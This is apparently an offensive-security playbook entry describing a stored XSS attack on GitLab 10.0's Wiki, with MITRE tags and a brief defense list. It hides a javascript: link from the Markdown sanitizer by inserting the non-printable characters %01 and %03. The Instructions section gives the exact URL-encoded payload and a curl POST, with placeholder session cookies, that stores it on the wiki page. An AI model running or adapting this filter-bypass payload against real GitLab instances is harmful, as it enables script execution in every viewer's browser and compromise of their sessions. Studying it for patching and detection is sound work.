---
tags:
  - xss-injection
  - payload-craft
  - character-bypass
  - gitlab
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-inject-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T00:11:09.717Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 6d4c9dfc-a14c-4aa7-a8e9-22607d1f4480
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-via-Non-Printable-Characters

## Summary

This procedure crafts and injects a URL-encoded XSS payload into the GitLab Wiki 'content' parameter, using non-printable characters (%01 and %03) to bypass the Markdown parser's sanitization filters, enabling stored JavaScript execution.

## Description

The vulnerability stems from the Markdown parser's inadequate handling of URL-decoded non-printable characters in hyperlinks. By encoding a javascript: URL within <a> tags and inserting %01/%03, the filter evasion allows storage of malicious content. Upon rendering, it becomes a clickable link executing arbitrary JS, persisting for all viewers in GitLab 10.0.

## Requirements

1. Intercepted POST request in Burp Suite
2. Knowledge of target GitLab project ID and Wiki slug
3. Valid session cookies for authenticated POST

## Defense

Defensive measures and detection strategies:

- Sanitize all Markdown inputs to strip non-printable characters and validate hyperlink schemes
- Employ strict CSP headers forbidding 'unsafe-inline' JavaScript
- Scan stored content for javascript: schemes and alert on encoding anomalies

## Objectives

1. Replace content with evasive XSS payload
2. Successfully save the tainted Wiki page
3. Ensure payload stores without triggering errors

## Instructions

### Step 1: Craft Payload

**Context**: Build the encoded string to evade filters while forming a valid hyperlink.

The payload is: %3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A. This decodes to <a href="javascript:confirm(document.domain)">Click to execute</a>

### Step 2: Modify and Forward Request

**Context**: Update the intercepted request and submit it to GitLab.

In Burp Repeater, edit the 'content' parameter to the payload above. Ensure headers include valid CSRF token and cookies. Click 'Forward' or use [[commands/curl-inject-xss-payload]] to simulate:

Execute [[commands/curl-inject-xss-payload]] to inject the payload:

```bash
curl -X POST 'http://gitlab-instance/projects/1/wikis/home' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'content=%3Ca+href%3D%22%01java%03script%3Aconfirm%28document.domain%29%22%3EClick+to+execute%3Ca%3E%0D%0A' \
  -b 'session_cookie=your_session'
```

> This sends the modified POST, storing the payload. Expected response: 200 OK with redirect to the Wiki page.

**Expected Output**: Wiki page saves, and source shows the encoded content persisted.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-inject-xss-payload]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[xss-injection]]
- [[payload-craft]]
- [[character-bypass]]
- [[gitlab]]
